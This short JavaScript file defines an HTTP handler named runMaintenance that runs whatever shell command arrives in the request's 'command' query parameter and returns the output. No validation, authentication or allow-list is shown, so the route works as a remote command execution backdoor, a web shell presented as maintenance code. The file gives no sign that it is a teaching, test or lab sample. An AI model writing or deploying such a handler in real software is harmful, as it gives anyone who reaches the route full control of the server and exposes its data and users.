import { exec } from "node:child_process";

export function runMaintenance(req, res) {
  const command = req.query.command;
  exec(command, (error, stdout) => {
    if (error) return res.status(500).send(error.message);
    res.send(stdout);
  });
}
